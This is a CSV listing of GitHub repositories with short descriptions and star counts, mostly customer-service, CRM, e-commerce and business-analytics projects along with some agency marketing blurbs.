,Url,Description,Topics,Stars
845,https://github.com/tuhin18003/EnvatoMarket-Custom-Product-License-Server.git,"{""Create your own custom license server with NodeJs where you can verify purchase, store client's information for your purchased item's and create clients account in your customer service portal with client's information. The script is just initialization of everything, you can easily extend it for your own requirements""}",,1
846,https://github.com/Techvinzan/Accounteer-is.gd.git,"The source code for the company website of Accounteer, a premium financial accounting services provider. This is a 4-page responsive, scalable and interactive website built for the company to have online visibility, reach more customers and overall harness the potentialities of the internet to accelerate their growth.",,1
847,https://github.com/magetop/magento2-age-verification.git,"Age verification module lets you restrict access to content, products, and services for users under a certain age. If you sell products intended for use by people over a certain age, it is your responsibility to verify the customers age prior to the sale.","magento,magento2,magento2-module,magento2-extension,magento2-age-verification,age-verification,age-verification-gate,magetop-extensions,magetop",1
848,https://github.com/dipam007/Hotel-Room-Booking-Website-using-php-ajax.git,"Admin can put hotel rooms photos and services and price of the room. Customers can Book One or many rooms and according to selected rooms total payment amount is shown to the user. For Sign In & Sign Up I use Ajax. Website Provide Room Booking, Add user and edit user at admin side, Sign In, Sign Up, Forgot Password, etc.",,1
849,https://github.com/TAMCHINGLOL/safeCarSystem.git,简单的车险理赔系统：客服系统 调度系统 审核系统 支付系统 后台管理系统； Simple auto insurance claims system: customer service system scheduling system audit system payment system background management system,,1
850,https://github.com/AshwiniBS/Mobile-E-Commerce.git,A ReactJS web application for a store which can sell mobile devices. This mini project is to demonstrate the working of an e-commerce website. Mobile and ecommerce applications are tools for accessing the Internet and for buying products and services. Customers today prefer everything to be available online because it is very convenient.,"reactjs,react-redux,jsx-syntax,mobile-ecommerce,javascript-library,ecommerce",1
851,https://github.com/Testorigensoftwaretesting/Let-s-discover-Blockchain-Technology-in-brief.git,"Technologists and Researchers alike are discussing how blockchain technology is the next huge thing crosswise over businesses from the fund to retail to even medicinal services. As indicated by Gartner, their customer request on blockchain and related subjects have quadrupled since August 2015.",,1
852,https://github.com/monicodev/Inventory-Model-Simulation.git,"Inventory model is a mathematical model that helps business in determining the optimum level of inventories that should be maintained in a production process, managing frequency of ordering, deciding on quantity of goods or raw materials to be stored, tracking flow of supply of raw materials and goods to provide uninterrupted service to customers without any delay in delivery.",,1
853,https://github.com/afjalul866/Afjalul-IT.git,"Afjalul IT is a Lead Generation service provider agency. We provide B2B lead Generation, Targeted Email List Building, Linkedin lead generation useing by sales navigator, also we provide Data Entry, Data Mining, Web Research, Web Scraping. and more related tasks. An email address is your first line of communication with a customer. Make sure you reach them.",,1
854,https://github.com/tianxu23/inmar_national_competition.git,"Wake Forest National Case Competition: Running Shoes Supply Chain Optimization (R, Tableau), found optimal number of distribution centers for Cheetah Running Shoes using R, considering shipping cost, shipping time and customer service; placing second of seven teams from around the US.",,1
855,https://github.com/jz200/crm-demo.git,This project is a demo version of a real-world application that allows business to manage customers and sales orders. The front end is built with Angular 7 and Bootstrap 4. JSON server is used to simulate Restful web services that are needed for CRUD operations.,,1
856,https://github.com/mohanedmoh/Talya-Propertities-Application.git,"{""Talya Android application is an Application that enables a leading real-estate company TALYA PROPERTIES to show it's services, lands and offers to valued clients. It allows customers to navigate their profile and track instalments, in addition, it authorizes agents to have more insights on sales size and other data.""}","realestateagency,android,android-application,java,xml",1
857,https://github.com/prathameshmahankal/Inventory-Management-Retail-Project.git,"In this project, I will analyze the problems faced by a departmental store at the University of Washington using Python and applied problem-solving skills to develop business models that resulted in improved profits, better customer service, reduced food wastage, and increased employee satisfaction.",,1
858,https://github.com/Ataimo007/Postit.ng.git,"The Postit App provides a platform where users can advertise their goods and services they wish to sell to those interested in buying, and those buyers can acquire sufficient detail about their Ads and who to contact to make a purchase. The Postit App has connected several sellers to potential customers helping them carry out their business with ease",,1
859,https://github.com/davidgalvis95/orders-checkout-microservice.git,"{""This is a service based in java, spring-boot, maven, and docker. It takes some order as an input and calculates how many the customer has to pay for some products, and where to go to deliver the order in a clearer way, providing an address so that front'end applications map the fields properly.""}",,1
860,https://github.com/magg6789/Busters-Brewhaus.git,Buster’s Brewhaus is a trending sports bar with various locations throughout the United States. Buster’s Brewhaus is known for its affordable pricing for lunch and dinner. Along with takeout options and reputable customer service. The purpose of this project is to perform pre-model analysis on Buster’s Brewhaus’ sales and the relevant analysis for continuous regressors that affect said sales. ,,1
861,https://github.com/nisha-iyer/Prediction-Analysis-of-Olist-Brazilian-E-commerce-Database.git,"To predict the customer review score of service provided by Olist, a Brazilian e-commerce store, and classify the review score into one of the three classes - Poor, Okay, Good. This classification is then used to derive actionable insights that assist in making business decisions. ",,1
862,https://github.com/akshachrya/turfanalysis.git,"Python Script to create table for reach and frequency table with possible configurations. TURF Analysis or Total Unduplicated Reach and Frequency Analysis, is a statistical research methodology that enables the assessment of potential of market research for a combination of products and services. It analysis the number of customers reached by a particular communication source and how often does that happen.",,1
863,https://github.com/Joseph-Odhiambo/Piza-pap.git,"This is a web application which is a pizza selling venture, that shows details about the services and different pizza sold, their menu and also allows customers to order online for their preferred pizza depending on size, crust they need and also allows them to input a location which they would love their pizza to be delivered to.","html5,jquery,javascript,makdown,bootstrap-4,css-animations",1
864,https://github.com/tcongwu/3cmap.git,"Based on JAVA EE, It is for a SNS website. We three graduate students imitated Renren.com (xiaonei.com) and Facebook.com, and constructed a SNS website, focusing on providing service for our target customers– the high middle school students in cities in China. We persisted for more than four months and  run out of money, failed.",,1
865,https://github.com/davists/Lumen-DDD-Authentication-Microservice.git,"{""A Microservice for register Petshop companies, managers and customers. The Companies are registred if their CNPJ belongs to the interest range. If a company is approved the service stores it's localization coordinates and sends a welcome email. All the login proccess relies uppon JWT Tokens.""}","lumen,ddd,microservice,authentication,jwt,php",1
866,https://github.com/arshadulhaque/abc.git," am a professional Graphics Designer  of this site but i have great 10+ years of experienced of some work such as  Remove Background With See Others Services as my Personal Commitment 100% Quality, fast delivery, 24/7 hours customer support and Client Satisfaction.",,1
867,https://github.com/ArzooKhan5110/SpeedEx-Courier-Service.git,"SpeedEx Courier Service is a Django based web application consisting of two zones namely General and Admin Zone with modules like Customer info, Complaint Management, Login Info, Notification Management, JobSeeker Management and some of the advanced modules like SMS API integration, Courier Management and Packet Tracking.","html,css,javascript,python,django,sqlite",1
868,https://github.com/Marina-Yesakova/HereIAm.git,"Android app for automatically sending messages when approaching a location. As an example, a pizza delivery service could automatically notify customers when the delivery is within specified distance. My friends and I use it to let each other know when we are approaching meeting place",,1
869,https://github.com/chris-ferris/PJWAuto.git,"This is the complete source for the PJW Auto iOS app which I developed via contract, publicly released with permission granted by the owner of PJW Automotive. This app is used by their customers as a mobile solution for scheduling automotive service appointments. More information on my work is available at https://linkedin.com/in/chris-ferris.",,1
870,https://github.com/whrss/WebHostRepo.git,"{""We at WHR provide 24/7/365 Server Management, Server Administration, Software Development and Web Hosting services to clients across the globe. We have a team of Support Technicians who strive to secure our customer's data and thereby their business.""}",,1
871,https://github.com/bilalprofile/POS.git,"A point of sale (POS) is a place where a customer executes the payment for goods or services and where sales taxes may become payable. A POS transaction may occur in person or online, with receipts generated either in print or electronically. Cloud-based POS systems are becoming increasingly popular among merchants.",,1
872,https://github.com/DanielAgbaji/HighGearMobileApplication.git,"This to be mobile application is to help create a better communication and transaction link between High Gear (Handle Bars of Hope), herein referred to as the company, and its clients, manage customers and render services in a more effective way.",,1
873,https://github.com/techednelson/firebase-push-notifications-system.git,FCM push notifications system is a full stack web application which main goal is to help companies to send and manage push notifications to their customer across Google Firebase Cloud Messaging Service as a middleware between the existing company application and Firebase Cloud platform.,,1
874,https://github.com/aayushs879/Text-Classification-with-a-Multi-Lingual-Corpus.git,"Societe Generale (SocGen) is a French multinational banking and financial services company. With over 1,54,000 employees, based in 76 countries, they handle over 32 million clients throughout the world on a daily basis.  They provide services like retail banking, corporate and investment banking, asset management, portfolio management, insurance and other financial services.  While handling customer complaints, it is hard to track the status of the complaint. To automate this process, SocGen wants you to build a model that can automatically predict the complaint status (how the complaint was resolved) based on the complaint submitted by the consumer and other related meta-data.",,1
875,https://github.com/tncyrdmc/Vcan.git,"Vcan Software Solutions was founded in Kakinada Andhra Pradesh, which specializes in Web Development, Website Design Services,Web Hosting, Mobile Website Designs, Mobile Applications Development,Digital Marketing Services (SEO,SEM,SMO,SMM),Animation Designs(2d,3d),Graphic Designing, branding, logo designs, Brochures, Creative Designs,Bulk & Voice SMS,Whatsapp & Email Marketing softwares. We are considered one of the best and the leading in Kakinada, Andhra Pradesh with our main Aim is being complete customer satisfaction. And We also Providing the Services all around the Andhra Pradesh(Vijayawada,Kakinada,Rajahmundry,Vizianagaram,Srikakulam,Guntur etc),Telangana(Hyderabad) & All over India.",,1
876,https://github.com/SPRTechs/Smart-Phone-Repair-Techs.git,"SPR Techs is locally Veteran owned and operated in by Kevin Harper. SPR Techs is comprised of knowledgeable mobile electronics technicians that are ready to service all Apple products including iPhones, iPads, iPods, Macbook Pros, Samsungs and more. We also service all major brands of cell phones, tablets and MP3 players including Samsung, Motorola, Nokia and LG.All of our work is 100% guaranteed and backed by our 90 day warranty. Our customers love coming in to see us for their repairs, as most of them can be performed under half an hour. We keeping almost every Apple & Samsung parts in stock and ready to go for same day service!",,1
877,https://github.com/jpwebagency/Web-Designing-and-Development.git,"{""P Web Agency one of the best Web Designing and Development Company in Ludhiana. We offer different kind of services to our customers like: Creative and Unique designing, Website Development, Digital Marketing and SEO, Mobile App Development, E-commerce or Shopify Website, Blog and Content Writing, Online Reputation Management, Responsive Web Designing.  We also provide an wide array of services to help businesses have a site with good content and reach a large amount of pubic. As an outsourcing company, we aspire to become world leader in services like content writing, web development, and web design. We work hard to grow, guarantee customer's satisfaction, renew products, and grow in the middle of the tough market. Our key is to keep the core values that identify our company.""}",,1
878,https://github.com/commencecrm/CRM-Software.git," Top Rated Web CRM software for small business and SME Offers additional CRM solutions for SFA, Marketing, Lead Management, Quoting, and Outlook. Comm ence® Corporation is a leading software manufacturer specializing in Customer Relationship Management and Business Process Automation software. Since its founding in 1988, the company has remained focused on providing software solutions that streamline the front office business processes that directly impact sales execution and customer service. Commence OnDemand is the ideal CRM solution for small to mid-size  businesses. It’s easy to use, affordable and offers functionality  that rivals many enterprise level solutions. This flexible  web-based hosted solution consists of a suite of modular  applications for account and contact management, sales force  automation, marketing, and customer service. Commence On-Demand is  an extremely intuitive CRM system that can be quickly customized to  meet unique business requirements. Wrapped around this state of the  art CRM software is a company with a 20-year track record for  delivering high quality business software and world class customer  service. Commence On-Demand is modular in design, allowing you to  select only those applications you need to manage your business.  ",,1
879,https://github.com/hoverlew/flyingfish-online.git,"Flyingfish (Internet flyingfish) was founded in 2012, is a company specializing in design and development of the Internet user experience design of brand building,  Created to date for more than 200 customers to provide innovative and professional design. Design services include: interactive prototype design,  Product visual design, website design and development, mobile and software product interface design, icon design, brand and graphic design, etc..  Our value and purpose is to create the most nice for users and customers design, design to enhance the product and enterprise value.",,1
880,https://github.com/mathriano/TELECOM_Mobility_Profile.git,"{""The purpose of these files original from DataStage is to provide a list of all the active subscribers on TELCO service through SMS/VOICE/DATA and the corresponding attributes such as Location, Active Time, Event Type, Duration, Quality, Duration, and Target. This data feeds into IBM SPSS Modeler as a analytical model for building the enhanced individual customer mobility, usage, and location profiles. This data is subsequently used for IBM SPSS Modeler + R reports for visualization and omni channel integration and to define predictive actions over Customer Insight's clusters""}",,1
881,https://github.com/Balasaheb02/CRM-Dashboard.git,"The meaning of CRM has changed a lot over the years. CRM is a term that was initially defined and designed to improve customer service. Today, though, it relates to an entire business strategy. CRM software acts as a single repository to bring your sales, marketing, and customer support activities together, and streamline your process, policy, and people in one platform. We’ve put together a short explanation video of what CRM really means and what it can do for your business. Check it out.",,1
882,https://github.com/shalikaprasad/Cloud-Provider-Selection-Recommendation-Using-Machine-Learning.git,"Cloud computing (CC) has recently been receiving tremendous attention from the IT trade and educational researchers. CC leverages its distinctive services to cloud customers in a very pay-as-you-go, anytime and anyplace manner. As well as Cloud services offer dynamically scalable services on demand. Therefore, service supplying plays a key role in CC. Then, it is good opportunity for customers to find suitable and lowly cost service for their project. Specially, Customer must be able to select appropriate cloud service according to their needs and money. It is time-consuming task for consumers to collect the necessary information and analyze from all cloud service providers to make right decision. As well as it is also a highly demanding task from a computational perspective because multiple consumers who have similar requirements conduct same computations repeatedly. They provide all products you might need for moving your business to the cloud. But these product offerings differ in pricing as well as the naming of their services. Some Businessmen already may use on-premises infrastructure or think which infrastructure will use for my project. They may have more complex problems like how to choose a cloud service, which services want use and specially how many costs want to pay for monthly or yearly. Sometimes, someone already use a cloud services, they have lot of problems like more expensive, less flexibility, hard to use, overwhelming options of services, poor management of GUI and tool, complex price schema and other issues. However, they must spend more price and time as useless. Because they could not select best cloud service provider early to their business. For solving the cloud service selection problem, many researchers have proposed some approaches including multicriteria decision analysis (MCDA) and Brokerage-Based Approach. But we cannot see any machine learning prediction system for solving this issue. This system enables the user to choose from among a number of available choices. In this paper, we make a neural network with TensorFlow to service selection in CC. This system focuses on three main players in CC. There are Amazon Web Services, Microsoft Azure and Google Cloud Platform in the race for cloud services providers. I identify and synthesize several products relevant for web services in Cloud providers. There are Featured, Compute, Storage, Database, Networking, Operation, Identity & Access and Cost. As well as I focus on Small and medium-sized businesses (SMBs). Because these are most aggressive segment in cloud service. It is less-complex IT needs, fewer legacy applications and less IT support than larger enterprises. We use Support Vector Machine (SVM), Multiple linear regression (MLR) and Multiple-criteria decision analysis (MCDA). We develop efficient and flexible recommendation system for ranking cloud service providers. I prove accuracy and effectiveness of our approach through an experimental study with the real and synthetic Cloud data.",,1
883,https://github.com/manozacharya/movie-ticket-management-system-in-cpp.git,"This Movie Ticket Management System is a simple console application built in C++ without the use of graphics. This is the basic user interface for ticket managing without going to the actual depart. This project is created in order to fulfill the gap between customer and the movie-counter for managing the tickets. Using this system, customers can book their seat without any obligation, at any time. This system is an attempt to provide the advantage for systematic ticket management for customers to creating the user friendly environment to facialite customer services, this system would play immense role for the better customer satisfication. In order to make a program possible, we use stream of class and file handling in C++ programming language. Two classes, class ticket and class amount can be found in this project in which class ticket is inherited from the class amount. The project is simple to understand, and the source code has been presented in an understandable manner. We use DevC++ as an IDE for better code compilation & debugging as it is modern and standard editor.",,1
884,https://github.com/andrewdrdrew/Unlockie.git,"I need an app created and coded that is similar to Uber but for locksmiths. I imagine an app that tracks locksmiths while they travel and work. Customers who lock themselves out of the car can open the app, select services needed (unlock car door, unlock house, install, repair, and adjust locks etc) the app will show available locksmiths nearby, the customer can click on them and read reviews, see a picture of the locksmith, access their website etc. And then pick a locksmith. Once a locksmith is selected the locksmith will be alerted and accept or deny request. If accepted the locksmith will accept and send an estimated arrival time. This arrival time will then be sent to the customer and the customer can confirm nor deny the time. Other factors to consider is people will need to be able to pay and accept payment through the app.People will need to create a profile.People will need to be able to choose if they are  registering as a locksmith or someone who needs a locksmith (customer or locksmith)The app should be quick and easy to set up as well as use.",,1
885,https://github.com/AlgoSkyNet/MARK-mobile.git,"Mobile Assets Real-Time Keeper  MARK is a risk management solution aimed to secure and protect your vehicles along with its cargo and passengers. It combines the power of a GPS (Global Positioning System) device and a software program that allows you to record vehicle and employee details, plot landmarks, create a delivery dispatch (pick-up and destination), pinpoint the vehicle’s present location and know its as speed, direction, mileage in real time.  MARK is also the only GPS system which is supported by a 24/7 call centre/monitoring station for dispatching and active tracking of vehicle and cargo until safely delivered to its destination. Furthermore, the 24/7 call centre provides emergency assistance service for vehicle breakdown, towing, medical service, and even security response through its own network and the local police. It is like having your own 9-1-1. Increase your income by reducing operational inefficiency, making accurate logistic decisions, reducing insurance cost, providing better customer service and most important of all, enhancing the safety and security of your vehicle, cargo and lives.  With MARK, you get premium values more than what you pay for.  ←Back Features→  git status git add . git commit -m """" git push origin",,1
886,https://github.com/richardbmx/FtxFt.git," Development of a web site that allows the registration of professionals of physical rehabilitation to offer their services at home and that future customers can enter and contract the service classified by region and specialization, all linked to the Blockchaing technology of ETH with a Token ERC20  / Desarrollo de una web site que permita el registro de profesionales del la rehabilitación física para ofrecer sus servicios a domicilio y que los futuros clientes puedan ingresar y contratar el servicio clasificado por región y especialización, todo vinculado a la tecnología Blockchaing de ETH con un Token ERC20.   ",,1
887,https://github.com/SoniSSk/Swarati_K-shortest_path.git,"Our project Swarati is based on Floyd Warshall and Dikstra’s Algorithm. We are also providing different type of riding services like economy ride and luxury ride for more comfortable experiences Firstly,we are asking customers to sign up if they are new users for that we are receiving phone no,user name,password. Otherwise they will have to log in first for any types of services. Time complexity: For all pair shortest path we have used warshall’s  algorithm with complexity O(n^3) For shortest path we have used Dijkstra’s algo having complexity O(nlogv),where v is vertices.",,1
888,https://github.com/Phan-Git/Apprentice-Chef.git,"My final model is Ordinary Least Square (Linear Least square) because it could balance the trade-off between variance and bias; my final model will be consistent.  The final model’s highest R-Square value is 0.903 for training and 0.902 for testing. In other words, Correct prediction is 90,2% of the holdout data, 25% of the dataset. First of all, the in-depth analysis indicates a strong increasing trend from attendance at master class and revenue. However, the trend seems downward after our users attended more than two classes. Our final model features a remarkable positive correlation: 62.7260. The effectiveness of our marketing activity: Master Class for consumers is considered as “Customer Education” (Okeke, 2020), which is a constant process aiming to equip our customers with knowledge and skill to gain the greatest advantage of our products. Although it totally fits with the value proposition of Apprentice Chef’s, the negative impact is unavoidable. If our users gain enough knowledge and experience, they achieve independence from our services.  The second insight relates to two variables which are Unique Meal Purchase and Spending based on categories. Our customers tend to focus on particular meals, the revenue decreases as unique meal increases. A possible explanation is the learning curve, users will be more fluent in cooking a specific meal and their quality also improves. However, a part of our potential customers mostly focus on only one meal, the amount of expenditure is up to $8,800 for a single meal. It implies an opportunity that we could diversify customers’ orders and provide more “unique” values to them.  Let us now consider an actionable recommendation, which improves UNIQUE MEAL PURCHASE, it directly improves $48.9631 of Revenue for each meal unit. Furthermore, the scatterplot of the explanatory variable and the response indicates that an increasing variety of meals purchased (more than 10) could lift the revenue upward. With the aim of increasing the unique meal purchased, a possible solution is educating customers: Master Class variable. My recommendation is to offer free first two masterclasses, it helps our customers gaining more knowledge about cooking and using the app. At the same time, it builds customer trust, customers are more likely to trust brands that devote effort to share understandings and enhance their knowledge; additionally, the class is a tool to reduce complaints. (Pine, Peppers and Rogers, 2020) At the same, innovative technology could be applied; the optimal one is Augmented Reality instruction. The technology could transform our customer journey; we provide instructions to the user in a real-time & interactive manner. References Okeke, K. (2020). [online] Available at: http://www.cxservice360.com/2017/11/29/educating-customers-benefits-achieve/ [Accessed 27 Jan. 2020]. Pine, B., Peppers, D. and Rogers, M. (2020). Do You Want to Keep Your Customers Forever?. [online] Harvard Business Review. Available at: https://hbr.org/1995/03/do-you-want-to-keep-your-customers-forever [Accessed 27 Jan. 2020].",,1
889,https://github.com/Rich-sam/Analysis-of-New-york-school-bus-break-down-.git,"The Bus Breakdown and Delay program gathers real-time information from school bus vendors that work in the region. Bus workers facing delays along the trip are advised to contact the dispatcher to the central office of the bus supplier. To record the event and inform OPT, the bus vendor staff are then instructed to log into the Bus Breakdown and Delay program. This program is used by OPT customer service representatives to notify parents who are calling with bus service queries. The Bus Breakdown and Delay program is available to the public and provides alerts in real time. All information is entered by vendor employees of school buses in the network.",,1
890,https://github.com/shirishgoyal/DirectCab.git,"DirectCab is a unique hack, which bridges the gap between passengers and cab providers by directional marking (with information about incremental distances from source location) and navigation routes on Yahoo! Maps. It helps calculating distance, estimated time of travel and cab fair including surcharge% between two locations to avoid any excessive charges by cab drivers. It has in-built merchandise facility for instant payment of cab fair for the customers registered with the cab service",,1
891,https://github.com/Shubha9937/Credit-EDA-Case-Study.git,"Problem Statement - I    Introduction This case study aims to give you an idea of applying EDA in a real business scenario. In this case study, apart from applying the techniques that you have learnt in the EDA module, you will also develop a basic understanding of risk analytics in banking and financial services and understand how data is used to minimise the risk of losing money while lending to customers.   ",,1
892,https://github.com/keerthanap8898/Automated-EDI-mapping.git,"• Analysis and automation of types of EDI mapping (to help facilitate the manual data mapping in data transformation systems). Using RNNs, Logistic Regression and Fuzzy logic to generate results and a comparison of the three. • Function to read customer requirement documents and generate a ruleset file dynamically. • Understanding the company’s mapping software and creating a service to automate simpler mappings using the above methods.",,1
893,https://github.com/AKASH164/To-mail-or-not-to-mail.git,"Direct mailings to a company’s potential customers – “junk mail” to many – can be a very effective way for them to market a product or a service. However, as we all know, much of this junk mail is really of no interest to the people that receive it. Most of it ends up thrown away, not only wasting the money that the company spent on it, but also filling up landfill waste sites or needing to be recycled.",,1
894,https://github.com/Luis14718/BWQS.git,"Bazaar Warehouse QR System The vision of the Bazaar Warehouse QR System is to develop a technological system that can easily check in and check out products, filtering information regarding donations, prices, and sales.  The mission of the Bazaar Warehouse QR System is to improve the efficiency of the inventory, pricing and sales procedures through a database and QR system. For giving a quicker and more organized service to customers in each bazaar scheduled by the Faith in Action department. ",,1
895,https://github.com/jcurl/CrashReporter.git,"Capture unhandled exceptions from your application with this library, to generate core dumps on Windows, crash and environment information and logging, all neatly packed in a ZIP file the customer can send to you for debugging. No online services or access required for user privacy. Add easily watchdog functionality to your threads to prevent unexpected hangs, useful for softwrae that runs in an automated environment.",,1
896,https://github.com/Siddharthj2002/Drone-Delivery-System.git,"This project is designed for a sample company named DroneDeliv. It is a company that deploys drones to deliver life essentials in a post-apocalypse world, where everyone stays home because of biohazards outside. The drones are assigned to different districts, each with a pre-calculated route to visit all households. In order to provide fast and responsive customer services, the drone will update the route to skip those with no active order. ","java,programming-language,data-structures,linked-list,problem-solving",1
897,https://github.com/MuhammadRazaKhan98/pnyadvertising.com.git,"Seo services As we know that marketing is an important tool for business growth and development. Technology and the internet change our way of advertising and promotions as well. because the majority of the audience is available online and rely on the web and internet to deal with the purchasing queries. Similarly, brands and companies adopt websites and internet-based advertisement methods. SEO is a known and common way to engage the customers and increase audience engagement with a product or brand. To deal with this regard, PNY advertising is the best platform for website SEO services in Lahore.  SEO SERVICES & ITS IMPORTANCE SEO services are associated with search engine optimization, in which companies improve their visibility online with the search engine. The main focus of SEO is to increase engagement and achieve the top position in the search engine results. SEO services in Lahore are getting high in demand due to an increase in competition. SEO will help a business to be on the search results if the audience puts the search query related to a similar product or service. This is an effective way to improve website ranking and rating as well. With SEO web design google algorithm can understand the site and show in the respective result status.  With the PNY advertising, you can get the web design plus SEO services together for the effective results. Because with the impressive web design and clear content availability it is possible to engage and make customers stay on the website, which directly impacts the rating and search results as well.  HOW SEO WORKS? In search engine optimization, the services provider uses multiple strategies to make the website search engine friendly. It can be possible with the web page optimization company, off-page optimization, and thorough technical SEO. The search engine issued a format according to that the websites can get the highest level of ranking. It can be with the:  Proper or effective information display on the websites Use of the popular keywords that people use to write on a search engine to get the answers to search queries. More relevant information or impressive SEO web design. Drag the audience from the multiple other websites and social sites directly to the website, it improves the traffic and engagement as well. Website structure and active content on the website play an important role. In web design plus SEO services, the thing is considered that the information should be as per customer’s interest and never increase the site bounce rate.",,1
898,https://github.com/shulikhatun/Digital-marketing.git,"The development of digital marketing is inseparable from technology development. One of the key points at the start was in 1971, where Ray Tomlinson sent the very first email and his technology set the platform to allow people to send and receive files through different machines.[10] However, the more recognizable period as being the start of Digital Marketing is 1990 as this was where the Archie search engine was created as an index for FTP sites. In the 1980s, the storage capacity of computers was already big enough to store huge volumes of customer information. Companies started choosing online techniques, such as database marketing, rather than a limited list broker.[11] These kinds of databases allowed companies to track customers\' information more effectively, thus transforming the relationship between buyer and seller. However, the manual process was not as efficient.  In the 1990s, the term Digital Marketing was first coined,.[12] With the debut of server/client architecture and the popularity of personal computers, Customer Relationship Management (CRM) applications became a significant factor in marketing technology.[citation needed] Fierce competition forced vendors to include more service into their software, for example, marketing, sales and service applications. Marketers were also able to own huge online customer data by eCRM software after the Internet was born. Companies could update the data of customer needs and obtain the priorities of their experience. This led to the first clickable banner ad being going live in 1994, which was the ""You Will"" campaign by AT&T and over the first four months of it going live, 44% of all people who saw it clicked on the ad. If you want to know more Click here",,1
899,https://github.com/geeva22/Online-Home-Need-Services.git,"An online home service refers to any information or data and offers provided via the Internet. This service not only allows customers to communicate with each other, they also provide unlimited access to information over the web or internet. This project entitled “ONLINE HOME NEEDS SERVICES” is essential in the current scenario to fulfill the needs of home-based services online. Here we are able to search for information online for collecting the contact details of the servicemen and hence it becomes a detailed process in searching and giving the right person at the right time. Online home needs services focus on location-based service men details depending on servicemen and their nature of work to their user requirements. In this application, user will be able to register and login and make some requests for services likes electrical, plumbing, furniture works, etc.  The request will be sent to the servicemen to their respective location, the servicemen will be able to accept the request by providing the date and time of visit. Based on the acceptance of servicemen for that particular request, admin will allocate those servicemen for the user. Once the admin allocates servicemen, the user will get the contact details about the servicemen via SMS and servicemen will also get SMS about the user with their location and contact details. Online home based demand services business these days have raised billions of dollars to provide services like house cleaning, home improvement, lawn care, home repairs, storage and more. We are living in a world of rapid and quick change. At present,  the Internet and mobile applications are changing and trending the way we imagine, live, communicate with each other and spend our leisure time.",,1
900,https://github.com/amritanshu00/PaySA.git,"This project aims at developing a digital payment platform and creating a payment gateway that offers comprehensive payment services for its customers. Pay-sa is a mobile commerce platform, offering its customers a digital wallet to store money and make quick payments. It requires users to create password protected accounts; that store information such as their name, mobile number, E-mail address, wallet balance, bank account details and net banking details; in order to carry out day to day transactions in a safe and convenient environment. The program stores a database of all its customers which contains all information stored by each account, with the application of file handling. The customer can edit most of this information, barring some invariable details, at any point in time. Due to lack of connectivity to the actual bank database at the current stage, the program creates a virtual bank database which requires the user to input his/her bank balance manually. The bank balance of the registered customers can be monitored and updated by a bank employee by logging in with the unique Bank User ID ( currently set as “bank1234” ) and password ( currently set as “1234bank” ). The customers can transfer money from their bank account to their digital wallet and vice-versa or from their digital wallet to any other customer’s digital wallet or bank account. Payments can be made conveniently using this program by transferring money from one person’s digital wallet to the intended recipient’s digital wallet or bank account, provided both the sender and the recipient are Pay-sa account holders. In addition to providing a platform for easy payment, Pay-sa also allows its users to request money/payment from other users by sending request messages. The program also stores a list of transactions made in the past ( up to a certain maximum limit ) by the customer, for future reference, in the form of a passbook. Each passbook entry includes the amount transferred and the details of the recipient ( name, mobile number, etc. ). Such a program can help minimize the use of cash in monetary transactions and in turn minimize the flow of black money in the market and promote transparency in finances.",,1
